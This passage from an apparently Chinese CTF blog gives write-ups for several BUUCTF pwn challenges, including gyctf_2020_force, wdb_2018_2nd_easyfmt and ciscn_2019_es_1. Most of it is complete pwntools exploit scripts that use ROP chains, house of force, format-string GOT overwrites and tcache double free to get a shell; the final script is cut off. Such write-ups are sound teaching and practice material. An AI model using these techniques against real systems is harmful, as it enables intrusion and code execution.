class="hljs-comment">#将mmap地址上的内容输出0x50个字节</span><br></code></pre></td></tr></table></figure><p><strong>mmap函数里的保护类权限</strong>：<br>PROT_READ是0x1<br>PROT_WRITE是0x2<br>PROT_EXEC是0x4</p><p>mmap申请的参数这里是6，可写可执行，也可用gdb调试，用vmmap看rwx</p><p><strong>具体解题步骤：</strong></p><p>1.构造rop链,使其可以调用read往mmap里读入0x100大小的数据，然后跳入0x123000执行接收flag</p><p>2.填入orw语句</p><p><strong>paload1解释：</strong></p><p>1.调用read往mmap里读入0x100大小的数据，然后跳入0x123000执行接收flag</p><p>2.用\x00填充至刚好覆盖rbp</p><p>3.返回地址填jmp rsp，使rip执行到栈上，rsp再减去0x30到buf处，再用jmp rsp控制rip到buf处执行</p><p>4.然后就能执行最前面的语句，调用read往mmap里读入0x100大小的数据，然后跳入0x123000执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,28690)</span><br>r=process(<span class="hljs-string">&#x27;./bad&#x27;</span>)<br>mmap=<span class="hljs-number">0x123000</span><br>jmp_rsp=<span class="hljs-number">0x400A01</span><br><span class="hljs-comment">#print len(asm(&quot;sub rsp,0x30;jmp rsp&quot;))</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#gdb.attach(r,&quot;b *0x400A49&quot;)</span><br>r.recvuntil(<span class="hljs-string">&#x27;have fun!&#x27;</span>)<br>payload1=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload1=payload1.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>payload1+=p64(jmp_rsp)<br>payload1+=asm(<span class="hljs-string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)<br>r.send(payload1)<br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap,<span class="hljs-number">0x50</span>)   <br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap,<span class="hljs-number">0x50</span>)      <br>r.send(asm(orw_payload))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-force">gyctf_2020_force</h3><p><strong>参考师傅</strong>：<a href="https://blog.csdn.net/weixin_44145820/article/details/105522043">BUUCTF-PWN gyctf_2020_force（house of force）_L.o.W的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_43986365/article/details/107976352">House of force —— gyctf_2020_force_PLpa的博客-CSDN博客</a></p><p>用house of force，修改malloc_hook为og</p><p><strong>具体步骤：</strong></p><p>1.分配一个大小超过 mmap 分配大小的堆，经 mmap 分配后地址与 libc 有固定偏移，由于本题<strong>告知了chunk地址</strong>，我gdb的vmmap看一下，得到的地址加一下就是libc_base</p><p>还能顺便得到heap的基址，进而得知topchunk的ptr</p><p>得知og，realloc</p><p>2.再申请个堆，利用house of force把malloc_hook-8改为og，malloc_hook改为realloc</p><p>3.再尝试申请堆，开shell</p><p>主要说一下offset-0xf-0x8-0x10-0x8，首先起码要减-0xf-0x8,又因为chunk的缘故，防止chunk的size盖掉，所以要-0x10</p><p>再调试看看，再-0x8的话填充8个‘a’，就能把og和realloc_hook布置好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./gyctf_2020_force&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27923</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = elf.arch</span><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;2:puts\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;size\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        ru(<span class="hljs-string">&#x27;addr 0x&#x27;</span>)<br>        heap=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>        sa(<span class="hljs-string">&#x27;content\n&#x27;</span>,content)<br>        <span class="hljs-keyword">return</span> heap<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>        sla(<span class="hljs-string">&#x27;2:puts\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-comment">#-----------------------------------------</span><br>libc_base=add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x201000</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;libc_base : &#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>heap_base=add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;heap_base : &#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br>top_ptr=heap_base+<span class="hljs-number">0x10</span><br>malloc_hook = libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] + libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;malloc_hook:&#x27;</span>+<span class="hljs-built_in">hex</span>(malloc_hook))<br>offset=malloc_hook-top_ptr-<span class="hljs-number">0xf</span>-<span class="hljs-number">0x8</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span><br>realloc=libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]+libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;realloc:&#x27;</span>+<span class="hljs-built_in">hex</span>(realloc))<br>og=o_g_old[<span class="hljs-number">1</span>]+libc_base<br>add(offset,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(og)+p64(realloc+<span class="hljs-number">16</span>))<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&#x27;2:puts\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;size\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x50</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-can-you-gets-me">picoctf_2018_can_you_gets_me</h3><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/112951679">BUUCTF]PWN——picoctf_2018_can_you_gets_me_mcmuyanga的博客-CSDN博客</a></p><p>对付这种静态编译题，ropchain铁定行</p><p>ROPgadget --binary PicoCTF_2018_can-you-gets-me  --ropchain</p><p><strong>注意</strong>要导入个pack，from struct import pack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28020</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./PicoCTF_2018_can-you-gets-me&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pd</span>():<br>        p = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x18</span>+<span class="hljs-number">4</span>)<br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b81c6</span>) <span class="hljs-comment"># pop eax ; ret</span><br>        p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080549db</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b81c6</span>) <span class="hljs-comment"># pop eax ; ret</span><br>        p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080549db</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049303</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080549db</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de955</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049303</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806cc25</span>) <span class="hljs-comment"># int 0x80</span><br>        <span class="hljs-keyword">return</span> p<br>payload=pd()<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-easy-equation">mrctf2020_easy_equation</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29673</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x4006D0</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wdb-2018-2nd-easyfmt">wdb_2018_2nd_easyfmt</h3><p>参考师傅：<a href="https://blog.csdn.net/qq_43935969/article/details/116140885">wdb_2018_2nd_easyfmt详解_像初雪一样自由洒落-CSDN博客</a></p><p>**pwntools工具使用：fmtstr_payload(offset,{printf_got:system})**把got表改为system</p><p>呃呃呃，好像只能用在32位</p><p><strong>具体步骤：</strong></p><p>1.利用格式化字符串漏洞泄露printf_got,得知libc_base,</p><p>2.利用格式化字符串漏洞把printf_got改为system</p><p>3.送入/bin/sh\x00</p><p>**注意点：**32为接收泄露addr=u32(r.recvuntil(‘\xf7’)[-4:])</p><p>**疑惑：**经格式字符串漏洞泄露出来的printf_addr=elf.got[‘printf’]和直接printf_got=elf.got[‘printf’]不是同一个地址</p><p>为啥？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./wdb_2018_2nd_easyfmt&#x27;)</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28021</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;Do you know repeater?&#x27;</span>)<br>r.sendline(p32(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>])+<span class="hljs-string">&#x27;%6$s&#x27;</span>)<br>printf_addr=u32(r.recvuntil(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(printf_addr)<br>base=printf_addr-libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(printf_got)<br>payload = fmtstr_payload(<span class="hljs-number">6</span>,&#123;printf_got:system&#125;)<br>r.sendline(payload)<br>r.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-es-1">ciscn_2019_es_1</h3><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/118193874?ops_request_misc=%7B%22request%5Fid%22%3A%22163555827616780366547653%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163555827616780366547653&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-118193874.pc_search_ecpm_flag&amp;utm_term=ciscn_2019_es_1&amp;spm=1018.2226.3001.4187">BUUCTF]PWN——ciscn_2019_es_1_mcmuyanga的博客-CSDN博客</a></p><p>本题有uaf漏洞</p><p><strong>具体步骤：</strong></p><p>1.分配small_bin大小的chunk，大于0x400即可，绕过tcache，释放后就会放到unsortbin中，利用uaf，泄露main_arena-96的地址，</p><p>由于malloc_hook在main_arena-0x10处,所以也能泄露libc_base=main_arena-0x10-libc.sym[‘__malloc_hook’]</p><p>2.利用doublefree，达成任意位置写入任意值的目的，这里我们往free_hook写入system</p><p>(这题不好改malloc_hook，因为修改后，程序执行下一次会申请一个0x18大小chunk，而我们不好控制为’/bin/sh\x00’)</p><p>3.释放存有/bin/sh\x00的某个堆，开shell</p><p><strong>ps:</strong></p><p>20年10月后，2.27libc加了double free检测。所以要做这道题本地调试的时候还得要使用<code>patchelf</code>来更改一下使用的动态库.</p><p>感谢下carol7s师傅帮我搞了个改动态库链接的一个脚本，不过貌似改了库链接后还是调试不了</p><p><strong>最后的doublefree自己的主观解释</strong>，没法调试看到：</p><p>释放两次时tcache的bin链：free1_addr-&gt;free1_addr</p><p>第一次申请时的bin链:free1_addr-&gt;free_hook_addr</p><p>第二次申请时的bin链：free_hook_addr</p><p>后面就申请到free_hook_addr中写入system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ciscn_2019_es_1&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28127</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,name,phone</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;name\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;please input name:\n&#x27;</span>,name)<br>    sa(<span class="hljs-string">&#x27;please input compary call:\n&#x27;</span>,phone)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span 